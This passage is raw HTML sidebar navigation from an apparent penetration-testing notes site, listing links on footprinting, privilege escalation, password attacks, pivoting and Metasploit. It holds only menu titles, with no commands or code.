data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_11"> <span class="md-nav__icon md-icon"></span> Defensive Considerations </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../defensive_considerations/hardening_ad/"> <span class="md-ellipsis"> Hardening Active Directory </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../defensive_considerations/additional_auditing_techniques/"> <span class="md-ellipsis"> Additional AD Auditing Techniques </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_2" id="__nav_4_3_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_2"> <span class="md-ellipsis"> Footprinting </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Footprinting" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_2"> <span class="md-nav__icon md-icon"></span> Footprinting </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/domain_information/"> <span class="md-ellipsis"> Domain Information </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_2_2" id="__nav_4_3_2_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_2_2"> <span class="md-ellipsis"> Host Based Enumeration </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Host Based Enumeration" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_2_2"> <span class="md-nav__icon md-icon"></span> Host Based Enumeration </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/ftp/"> <span class="md-ellipsis"> FTP </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/smb/"> <span class="md-ellipsis"> SMB </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/nfs/"> <span class="md-ellipsis"> NFS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/dns/"> <span class="md-ellipsis"> DNS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/smtp/"> <span class="md-ellipsis"> SMTP </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/imap_pop3/"> <span class="md-ellipsis"> IMAP/POP3 </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/snmp/"> <span class="md-ellipsis"> SNMP </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/mysql/"> <span class="md-ellipsis"> MySQL </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/mssql/"> <span class="md-ellipsis"> MSSQL </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/ipmi/"> <span class="md-ellipsis"> IPMI </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_2_3" id="__nav_4_3_2_3" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_2_3"> <span class="md-ellipsis"> Remote Management Protocols </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Remote Management Protocols" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_2_3"> <span class="md-nav__icon md-icon"></span> Remote Management Protocols </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/linux_remote_management_protocol/"> <span class="md-ellipsis"> Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/windows_remote_management_protocol/"> <span class="md-ellipsis"> Windows </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_3" id="__nav_4_3_3" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_3"> <span class="md-ellipsis"> Common Services </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Common Services" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_3"> <span class="md-nav__icon md-icon"></span> Common Services </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../attacking_common_services/interacting/"> <span class="md-ellipsis"> Interacting </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../attacking_common_services/attacking_ftp/"> <span class="md-ellipsis"> FTP </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../attacking_common_services/attacking_smb/"> <span class="md-ellipsis"> SMB </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../attacking_common_services/attacking_sql/"> <span class="md-ellipsis"> SQL Databases </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../attacking_common_services/attacking_rdp/"> <span class="md-ellipsis"> RDP </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../attacking_common_services/attacking_dns/"> <span class="md-ellipsis"> DNS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../attacking_common_services/attacking_email_services/"> <span class="md-ellipsis"> Email Services </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4" id="__nav_4_3_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4"> <span class="md-ellipsis"> Privilege Escalation </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Privilege Escalation" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_4"> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1" id="__nav_4_3_4_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1"> <span class="md-ellipsis"> Windows </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Windows" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_4_1"> <span class="md-nav__icon md-icon"></span> Windows </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1_1" id="__nav_4_3_4_1_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1_1"> <span class="md-ellipsis"> Enumeration </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Enumeration" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_1_1"> <span class="md-nav__icon md-icon"></span> Enumeration </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/gtlotl/"> <span class="md-ellipsis"> Situational Awareness </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/init_enum/"> <span class="md-ellipsis"> Initial Enumeration </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/comm_with_ps/"> <span class="md-ellipsis"> Communication with Processes </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1_2" id="__nav_4_3_4_1_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1_2"> <span class="md-ellipsis"> User Privileges </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="User Privileges" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_1_2"> <span class="md-nav__icon md-icon"></span> User Privileges </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/seimpersonate_seassignprimarytoken/"> <span class="md-ellipsis"> SeImpersonate and SeAssignPrimaryToken </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/sebugpriv/"> <span class="md-ellipsis"> SeDebugPrivilege </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/setakeownershippriv/"> <span class="md-ellipsis"> SeTakeOwnershipPrivilege </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1_3" id="__nav_4_3_4_1_3" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1_3"> <span class="md-ellipsis"> Group Privileges </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Group Privileges" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_1_3"> <span class="md-nav__icon md-icon"></span> Group Privileges </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/builtin_groups/"> <span class="md-ellipsis"> Windows Built-in Groups </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/eventlog_readers/"> <span class="md-ellipsis"> Event Log Readers </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/dnsadmins/"> <span class="md-ellipsis"> DnsAdmins </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/hyperv_admins/"> <span class="md-ellipsis"> Hyper-V Administrators </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/print_operators/"> <span class="md-ellipsis"> Print Operators </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/server_operators/"> <span class="md-ellipsis"> Server Operators </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1_4" id="__nav_4_3_4_1_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1_4"> <span class="md-ellipsis"> OS </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="OS" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_1_4"> <span class="md-nav__icon md-icon"></span> OS </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/user_account_control/"> <span class="md-ellipsis"> User Account Control </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/weak_permissions/"> <span class="md-ellipsis"> Weak Permissions </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/vulnerable_services/"> <span class="md-ellipsis"> Vulnerable Services </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1_5" id="__nav_4_3_4_1_5" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1_5"> <span class="md-ellipsis"> Credential Theft </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Credential Theft" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_1_5"> <span class="md-nav__icon md-icon"></span> Credential Theft </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/credential_hunting/"> <span class="md-ellipsis"> Credential Hunting </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/other_files/"> <span class="md-ellipsis"> Other Files </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/further_credential_theft/"> <span class="md-ellipsis"> Further Credential Theft </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1_6" id="__nav_4_3_4_1_6" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1_6"> <span class="md-ellipsis"> Additional Techniques </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Additional Techniques" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_1_6"> <span class="md-nav__icon md-icon"></span> Additional Techniques </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/interacting_with_users/"> <span class="md-ellipsis"> Interacting with Users </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/miscellaneous_techniques/"> <span class="md-ellipsis"> Miscellaneous Techniques </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_2" id="__nav_4_3_4_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_2"> <span class="md-ellipsis"> Linux </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Linux" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_4_2"> <span class="md-nav__icon md-icon"></span> Linux </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/enumeration/"> <span class="md-ellipsis"> Enumeration </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_2_2" id="__nav_4_3_4_2_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_2_2"> <span class="md-ellipsis"> Local Techniques </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Local Techniques" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_2_2"> <span class="md-nav__icon md-icon"></span> Local Techniques </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/kernel_exploits/"> <span class="md-ellipsis"> Kernel Exploits </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/vulnerable_services/"> <span class="md-ellipsis"> Vulnerable Services </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/cron_jobs/"> <span class="md-ellipsis"> Cron Jobs </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/special_permissions/"> <span class="md-ellipsis"> Special Permissions </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/sudo_rights_abuse/"> <span class="md-ellipsis"> Sudo Rights Abuse </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/path_abuse/"> <span class="md-ellipsis"> Path Abuse </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/wilcard_abuse/"> <span class="md-ellipsis"> Wildcard Abuse </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/credential_hunting/"> <span class="md-ellipsis"> Credential Hunting </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/shared_libraries/"> <span class="md-ellipsis"> Shared Libraries </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/shared_object_hijacking/"> <span class="md-ellipsis"> Shared Object Hijacking </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/privileged_groups/"> <span class="md-ellipsis"> Privileged Groups </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/misc_techniques/"> <span class="md-ellipsis"> Miscellaneous Techniques </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_5" id="__nav_4_3_5" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_5"> <span class="md-ellipsis"> File Transfers </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="File Transfers" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_5"> <span class="md-nav__icon md-icon"></span> File Transfers </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_5_1" id="__nav_4_3_5_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_5_1"> <span class="md-ellipsis"> File Tranfer Methods </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="File Tranfer Methods" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_5_1"> <span class="md-nav__icon md-icon"></span> File Tranfer Methods </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../file_transfers/windows_file_transfer_methods/"> <span class="md-ellipsis"> Windows </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../file_transfers/linux_file_transfer_methods/"> <span class="md-ellipsis"> Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../file_transfers/transfering_files_w_code/"> <span class="md-ellipsis"> Transfering Files with Code </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../file_transfers/miscellaneous_file_transfer_methods/"> <span class="md-ellipsis"> Miscellaneous </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../file_transfers/protected_file_transfers/"> <span class="md-ellipsis"> Protected File Transfers </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../file_transfers/catching_files_over_https/"> <span class="md-ellipsis"> Catching Files over HTTP/S </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../file_transfers/living_off_the_land/"> <span class="md-ellipsis"> LOTL </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_6" id="__nav_4_3_6" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_6"> <span class="md-ellipsis"> Tools </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Tools" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_6"> <span class="md-nav__icon md-icon"></span> Tools </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/nmap/"> <span class="md-ellipsis"> Nmap </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_6_2" id="__nav_4_3_6_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_6_2"> <span class="md-ellipsis"> MSF </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="MSF" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_6_2"> <span class="md-nav__icon md-icon"></span> MSF </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_6_2_1" id="__nav_4_3_6_2_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_6_2_1"> <span class="md-ellipsis"> Components </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Components" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_6_2_1"> <span class="md-nav__icon md-icon"></span> Components </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/msf/components/msf_modules/"> <span class="md-ellipsis"> Modules </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/msf/components/msf_targets/"> <span class="md-ellipsis"> Targets </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/msf/components/msf_payloads/"> <span class="md-ellipsis"> Payloads </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_6_2_2" id="__nav_4_3_6_2_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_6_2_2"> <span class="md-ellipsis"> Sessions </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Sessions" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_6_2_2"> <span class="md-nav__icon md-icon"></span> Sessions </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/msf/sessions/msf_sessions_jobs/"> <span class="md-ellipsis"> Sessions &amp; Jobs </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/msf/sessions/msf_sessions_meterpreter/"> <span class="md-ellipsis"> Meterpreter </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/msf/additional_features/evasion/"> <span class="md-ellipsis"> Evasion </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_7" id="__nav_4_3_7" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_7"> <span class="md-ellipsis"> Password Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Password Attacks" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_7"> <span class="md-nav__icon md-icon"></span> Password Attacks </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_7_1" id="__nav_4_3_7_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_7_1"> <span class="md-ellipsis"> Remote Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Remote Attacks" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_7_1"> <span class="md-nav__icon md-icon"></span> Remote Attacks </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/remote_password_attacks/network_services/"> <span class="md-ellipsis"> Network Services </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/remote_password_attacks/password_mutations/"> <span class="md-ellipsis"> Password Mutations </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_7_2" id="__nav_4_3_7_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_7_2"> <span class="md-ellipsis"> Windows Local Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Windows Local Attacks" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_7_2"> <span class="md-nav__icon md-icon"></span> Windows Local Attacks </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/windows_local_password_attacks/attacking_sam/"> <span class="md-ellipsis"> Attacking Sam </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/windows_local_password_attacks/attacking_lsass/"> <span class="md-ellipsis"> Attacking LSASS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/windows_local_password_attacks/attacking_ad_ntdsdit/"> <span class="md-ellipsis"> Attacking AD &amp; NTDS.dit </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/windows_local_password_attacks/credential_hunting/"> <span class="md-ellipsis"> Credential Hunting </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_7_3" id="__nav_4_3_7_3" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_7_3"> <span class="md-ellipsis"> Linux Local Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Linux Local Attacks" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_7_3"> <span class="md-nav__icon md-icon"></span> Linux Local Attacks </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/linux_local_password_attacks/credential_hunting/"> <span class="md-ellipsis"> Credential Hunting </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/linux_local_password_attacks/passwd_shadow_opasswd/"> <span class="md-ellipsis"> Passwd, Shadow, Opasswd </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_7_4" id="__nav_4_3_7_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_7_4"> <span class="md-ellipsis"> Cracking Files </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Cracking Files" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_7_4"> <span class="md-nav__icon md-icon"></span> Cracking Files </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/cracking_files/protected_files/"> <span class="md-ellipsis"> Protected Files </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/cracking_files/protected_archives/"> <span class="md-ellipsis"> Protected Archives </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_8" id="__nav_4_3_8" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_8"> <span class="md-ellipsis"> Pivoting </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Pivoting" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_8"> <span class="md-nav__icon md-icon"></span> Pivoting </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/dynamic_port_forwarding_ssh/"> <span class="md-ellipsis"> Dynamic Port Forwarding w/ SSH and SOCKS Tunneling </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/remote_reverse_port_forwarding_ssh/"> <span class="md-ellipsis"> Remote/Reverse Port Forwarding w/ SSH </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/meterpreter_tunneling_and_port_forwarding/"> <span class="md-ellipsis"> Meterpreter Tunneling &amp; Port Forwarding </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_8_4" id="__nav_4_3_8_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_8_4"> <span class="md-ellipsis"> Socat </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Socat" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_8_4"> <span class="md-nav__icon md-icon"></span> Socat </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/socat/socat_reverse_shell/"> <span class="md-ellipsis"> Reverse Shell </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/socat/socat_bind_shell/"> <span class="md-ellipsis"> Bind Shell </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/obstacles/ssh_for_win_plink/"> <span class="md-ellipsis"> SSH for Windows: plink </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/obstacles/ssh_pivoting_sshuttle/"> <span class="md-ellipsis"> SSH Pivoting w/ Sshuttle </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/obstacles/webserver_pivoting_rpivot/"> <span class="md-ellipsis"> WebServer Pivoting w/ Rpivot </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/obstacles/port_forwarding_windows_netsh/"> <span class="md-ellipsis"> Port Forwarding Windows: Netsh </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/dns_tunneling_dnscat2/"> <span class="md-ellipsis"> DNS Tunneling w/ Dnscat2 </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/socks5_tunneling_chisel/"> <span class="md-ellipsis"> SOCKS5 Tunneling with Chisel </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/icmp_tunneling_socks/"> <span class="md-ellipsis"> ICMP Tunneling with SOCKS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/rdp_socks_tunneling_socksoverrdp/"> <span class="md-ellipsis"> RDP and SOCKS Tunneling w/ SocksOverRDP </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_9" id="__nav_4_3_9" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_9"> <span class="md-ellipsis"> Web </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Web" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_9"> <span class="md-nav__icon md-icon"></span> Web </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_9_1" id="__nav_4_3_9_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_9_1"> <span class="md-ellipsis"> Information Gathering </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Information Gathering" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_9_1"> <span class="md-nav__icon md-icon"></span> Information Gathering </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle 